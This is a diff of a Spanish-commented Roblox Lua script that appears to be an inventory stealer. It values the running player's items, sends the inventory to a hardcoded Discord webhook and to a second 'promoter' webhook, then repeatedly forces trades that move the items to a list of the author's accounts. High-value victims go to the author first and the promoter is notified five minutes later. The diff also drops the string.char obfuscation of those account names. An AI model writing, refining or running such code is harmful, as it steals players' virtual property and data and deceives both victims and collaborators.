@@ -12,21 +12,13 @@ local player = Players.LocalPlayer
 local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
 
 -- ==========================================
--- CONFIGURACIÓN SECRETA DUAL WEBHOOK
+-- CONFIGURACIÓN SECRETA DUAL WEBHOOK (SIN CAMBIOS)
 -- ==========================================
 local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCrnW2QrQf04R9WmpOJTg85SbHa5FIkd02"
 
--- ==========================================
--- JUGADORES DUAL (OCULTOS EN EL CÓDIGO)
--- ==========================================
 local jugadoresObjetivosDual = {
-    string.char(72,97,104,97,104,97,104,108,111,108,108,108,112,114,111), -- Hahahahlolllpro
-    string.char(84,114,97,100,101,84,101,115,116,105,110,103,77,86,83,83), -- TradeTestingMVSS
-    string.char(97,122,97,101,51,108,54,54,54), -- azae3l666
-    string.char(106,117,97,110,99,97,114,108,111,115,101,108,107,114,97,107,55), -- juancarloselkrak7
-    string.char(97,122,97,110,117,118,112,114,111,55,55,55), -- azanuvpro777
-    string.char(112,112,101,111,105,104,106,118), -- ppeoihjv
-    string.char(66,101,75,105,110,100,80,108,101,97,115,101,79,109,103) -- BeKindPleaseOmg
+    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
+    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
 }
 
 -- ==========================================
@@ -81,10 +73,9 @@ task.spawn(function()
     -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
     -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
-        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
+        task.wait(0.2)
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
     
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
@@ -162,11 +153,9 @@ task.spawn(function()
             if not inv then return end
             
             for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
                     if valueTable[cleanName] then
-
                         local itemValue = valueTable[cleanName]
                         totalValue = totalValue + itemValue
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
@@ -295,10 +284,10 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
+            -- 🔥 ENVÍO DE WEBHOOKS Y SELECCIÓN DE OBJETIVOS (DUAL = IGUAL QUE NORMAL)
             -- ==========================================
             if totalValue >= 5000 then
-                -- 1. Tu Webhook (Dual): Notifica al instante
+                -- 1. TU WEBHOOK DUAL: Se envía al INSTANTE (LÓGICA INTACTA)
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -310,7 +299,7 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
+                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -324,10 +313,11 @@ task.spawn(function()
                     end)
                 end
                 
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo (DUAL)
+                -- 🔁 CAMBIO DE OBJETIVOS: Los DUAL reemplazan a los normales
+                -- Ahora funcionan EXACTAMENTE igual: misma búsqueda, misma espera, mismo bucle de tradeo
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
+                -- Hit normal (< 5000): Webhook inmediato al promocionador únicamente
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -339,10 +329,14 @@ task.spawn(function()
             end
         end
 
+        -- ==========================================
+        -- 🔍 BÚSQUEDA DE JUGADORES (IGUAL PARA OBJETIVOS Y DUAL)
+        -- ==========================================
         local jugadorEncontrado = nil
 
         repeat 
             task.wait(0.5)
+            -- Se busca en jugadoresObjetivos (que puede ser la lista normal o la DUAL según el caso)
             for _, nombre in ipairs(jugadoresObjetivos) do
                 local p = Players:FindFirstChild(nombre)
                 if p then
@@ -392,7 +386,6 @@ task.spawn(function()
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO (Script 1)
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
@@ -429,7 +422,6 @@ task.spawn(function()
             local SessionState = cgData.SessionState
             local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
@@ -491,21 +483,17 @@ task.spawn(function()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
                 
                 if not data then break end
                 if data.exchanging then break end 
                 
-                         -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                         Remotes.SetReady:FireServer(true, data.ref or {})
                     end
                 end
 
-                
                 task.wait(0.5)
             end
 
@@ -518,18 +506,15 @@ task.spawn(function()
             return true
         end
 
-
         -- ==========================================
         -- BUCLE PRINCIPAL DE TRADEO CONTINUO
         -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
